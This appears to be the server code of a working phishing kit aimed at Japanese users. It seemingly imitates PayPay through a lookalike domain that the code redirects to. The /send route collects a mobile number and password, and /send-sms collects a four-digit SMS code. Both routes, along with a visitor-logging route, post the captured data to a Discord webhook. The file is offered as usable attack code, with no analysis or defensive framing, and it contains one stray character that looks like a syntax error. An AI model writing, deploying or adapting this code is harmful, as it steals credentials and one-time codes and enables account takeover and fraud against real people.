const express = require("express");
const app = express();
const cookieParser = require("cookie-parser");
const { getAccessLog } = require("./dist/Access");

app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());

const webhook = process.env.DISCORD_WEBHOOK;


app.get(["/", "/index.html"], (req, res, next) => {
  if (!req.cookies.pp_session) {
    res.cookie("pp_session", "1", { httpOnly: true, secure: true, path: "/" });
  }
  next(); 
});


app.use((req, res, next) => {
  const protectedFiles = ["/login.html", "/sms.html"];
  
  if (req.method === "GET" && protectedFiles.includes(req.path)) {
    if (req.cookies.pp_session !== "1") {
      return res.status(403).send(`
        <!DOCTYPE html>
        <html lang="ja">
        <head><meta charset="UTF-8"><title>403 Forbidden</title></head>
        <body style="text-align:center; padding:50px; font-family:sans-serif; background:#f7f7f7;">
          <h1 style="color:#333;">403 Forbidden</h1>
          <p style="color:#666;">不正なアクセスです。最初からやり直してください。</p>
        </body>
        </html>
      `);
    }
  }
  next(); 
});

）
app.use(express.static("."));



app.post("/send", async (req, res) => {
  const phone = req.body.name;
  const password = req.body.message;

  const safePhone = typeof phone === 'string' ? phone : '';
  const safePassword = typeof password === 'string' ? password : '';
  const cleanPhone = safePhone.replace(/[- ]/g, '');

  if (!/^(090|080|070|060)/.test(cleanPhone) || !/[A-Z]/.test(safePassword)) {
    return res.redirect("/login.html?error=1");
  }

  try {
    if (!webhook) throw new Error("DISCORD_WEBHOOK is not set");

    const response = await fetch(webhook, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        content: `\ntel: ${cleanPhone}\npass: ${safePassword}`
      })
    });

    if (!response.ok) {
      console.error(`Webhook送信失敗: Status ${response.status}`);
    } else {
      console.log("送信成功");
    }

    const telParam = phone ? `?tel=${encodeURIComponent(phone)}` : '';
    res.redirect(`/sms.html${telParam}`);

  } catch (error) {
    console.error("送信失敗:", error);
    res.status(500).send("エラー");
  }
});


app.post("/send-sms", async (req, res) => {
  const smsCode = req.body.sms_code;
  const safeCode = typeof smsCode === 'string' ? smsCode : '';

  if (!/^\d{4}$/.test(safeCode)) {
    return res.redirect("/sms.html?error=1");
  }

  try {
    if (!webhook) throw new Error("DISCORD_WEBHOOK is not set");

    const response = await fetch(webhook, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        content: `\nsms: ${safeCode}`
      })
    });

    if (!response.ok) {
      console.error(`Webhook送信失敗: Status ${response.status}`);
    } else {
      console.log("sms送信成功");
    }
    
    res.redirect("https://qay-payqay.up.railway.app/sms.html?error=2"); 

  } catch (error) {
    console.error("sms送信失敗:", error);
    res.status(500).send("エラー");
  }
});

app.post("/log-access", async (req, res) => {
  const accessWebhook = process.env.ACCESS_WEBHOOK || process.env.DISCORD_WEBHOOK;

  try {
    if (!accessWebhook) throw new Error("ACCESS_WEBHOOK or DISCORD_WEBHOOK is not set");

    const logMessage = await getAccessLog(req, req.body);

    const response = await fetch(accessWebhook, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({ content: logMessage })
    });

    if (!response.ok) {
      console.error(`Access Webhook送信失敗: Status ${response.status}`);
      return res.status(500).send("Error");
    }

    res.status(200).send("OK");
  } catch (error) {
    console.error("Access送信失敗:", error);
    res.status(500).send("Error");
  }
});

app.listen(process.env.PORT || 3000, () => {
  console.log("Server started");
});
